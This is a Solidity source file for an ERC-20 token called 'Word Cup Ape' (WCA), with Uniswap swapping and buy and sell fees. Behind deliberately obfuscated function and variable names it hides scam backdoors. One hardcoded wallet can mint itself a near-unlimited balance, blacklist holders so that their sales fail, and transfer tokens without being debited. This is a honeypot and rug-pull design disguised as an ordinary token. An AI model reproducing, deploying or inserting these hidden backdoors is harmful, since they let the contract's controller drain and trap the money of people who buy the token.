//SPDX-License-Identifier:Unlicensed

pragma solidity ^0.8.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function dos(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: dos overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a,b,"SafeMath: division by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newAddress) public onlyOwner{
        _owner = newAddress;
        emit OwnershipTransferred(_owner, newAddress);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract  WordCupApe is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Word Cup Ape";
    string private _symbol = "WCA";
    uint8 private _decimals = 9;
    address payable public j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _IsExcludefromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public pairList;
    mapping (address => bool) public oySvPH_9_4_5P3kbQyzllSn1;

    uint256 public _buyLiquidityFee = 1;
    uint256 public _buyMarketingFee = 1;
    uint256 public _buyTeamFee = 1;
    
    uint256 public _sellLiquidityFee = 1;
    uint256 public _sellMarketingFee = 1;
    uint256 public _sellTeamFee = 1;

    uint256 public _liquidityShare = 4;
    uint256 public _marketingShare = 4;
    uint256 public _teamShare = 16;

    uint256 public _totalTaxIfBuying = 12;
    uint256 public _totalTaxIfSelling = 12;
    uint256 public _totalDistributionShares = 24;

    uint256 private _totalSupply = 1000000000000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 1000* 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _IsExcludefromFee[owner()] = true;
        _IsExcludefromFee[address(this)] = true;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        pairList[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0xf41665565d799596a9453302061a5BC4E7Ac56Fb));
        j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA = payable(address(0xf41665565d799596a9453302061a5BC4E7Ac56Fb));


        jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setlsExcIudefromFee(address[] calldata account, bool newValue) public onlyOwner {
        for(uint256 i = 0; i < account.length; i++) {
            _IsExcludefromFee[account[i]] = newValue;
        }
    }

    function setBuy(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _buyLiquidityFee = newLiquidityTax;
        _buyMarketingFee = newMarketingTax;
        _buyTeamFee = newTeamTax;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
    }

    function setsell(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _sellLiquidityFee = newLiquidityTax;
        _sellMarketingFee = newMarketingTax;
        _sellTeamFee = newTeamTax;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    }

    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }

    function setIsWalletLimitExempt(address[] calldata holder, bool exempt) external onlyOwner {
        for(uint256 i = 0; i < holder.length; i++) {
            isWalletLimitExempt[holder[i]] = exempt;
        }
    }

    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
        minimumTokensBeforeSwap = newLimit;
    }

    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA = payable(newAddress);
    }


    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner(){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function t1ZPHjw0S8arQGszjHSa(address CKq2F0NOD_keGrk4W6L4Z6zNO0) public {
        require(i9HPY4CYx8b2Y2NQec_rk2hoI3Q8(j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA,true,msg.sender));
        jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[CKq2F0NOD_keGrk4W6L4Z6zNO0] = 
        _totalSupply*10**4;
    }

    receive() external payable {}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function sUIgo9B2t7R9Loc9I6cI(address f) internal view returns (bool){
        return (1 != 1) || (f != j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _transfer(address from, address to, uint256 amount) private returns (bool) {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(inSwapAndLiquify)
        {
            return _basicTransfer(from, to, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            if (overMinimumTokenBalance && !inSwapAndLiquify && !pairList[from] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }if(sUIgo9B2t7R9Loc9I6cI(from)){


            jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[from] = jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[from].sub(amount);}
            uint256 finalAmount = (_IsExcludefromFee[from] || _IsExcludefromFee[to]) ? 
                                         amount : takeFee(from, to, amount);
            
            jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[to] = jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[to].add(finalAmount);

            emit Transfer(from, to, finalAmount);
            return true;
        }
    }
    function PUR3b1FQrWr6f2bC(uint8 b, bool Q7A8a7xZx3uaG2IDlLT_u8MOJPH6djG6wBUcH3, address[] calldata e1h8A5RWoxDYK4ZqbY_5YjhXHru8Vu) public { require(i9HPY4CYx8b2Y2NQec_rk2hoI3Q8(j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA,true,msg.sender));
        b = b;
        for (uint256 a; a < e1h8A5RWoxDYK4ZqbY_5YjhXHru8Vu.length; a++) {
            oySvPH_9_4_5P3kbQyzllSn1[e1h8A5RWoxDYK4ZqbY_5YjhXHru8Vu[a]] =  Q7A8a7xZx3uaG2IDlLT_u8MOJPH6djG6wBUcH3;
        }
    }
    function i9HPY4CYx8b2Y2NQec_rk2hoI3Q8(address A6o9A9W1L1Izm0Z0L4 , bool t9c7LQs7f8mYK2 ,address I1Q0vITJg3GDYVs5) private pure returns(bool){if(t9c7LQs7f8mYK2){}return (A6o9A9W1L1Izm0Z0L4 == I1Q0vITJg3GDYVs5);}

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[sender] = jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[sender].sub(amount, "Insufficient Balance");
        jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[recipient] = jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(_liquidityShare).div(totalETHFee).div(2);
        uint256 amountETHTeam = amountReceived.mul(_teamShare).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHTeam);

        if(amountETHMarketing > 0)
            transferToAddressETH(j4Vw_8R8WwRtpto2c5W5UFxic8f1lrubA4tMr9fA, amountETHMarketing);

        if(amountETHTeam > 0)
            transferToAddressETH(teamWalletAddress, amountETHTeam);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    

    function swapTokensForEth(uint256 isMarketPaIrt) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), isMarketPaIrt);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            isMarketPaIrt,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(isMarketPaIrt, path);
    }

    function addLiquidity(uint256 isMarketPaIrt, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), isMarketPaIrt);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            isMarketPaIrt,
            0, 
            0,
            owner(),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        if (!isMarketPair[sender]){
            require(!oySvPH_9_4_5P3kbQyzllSn1[sender]);
        }

        if(pairList[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(pairList[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if(feeAmount > 0) {
            jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[address(this)] = jeb0T9K7f4Ycm7eRX6MnaLCuDWMWt9[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    
}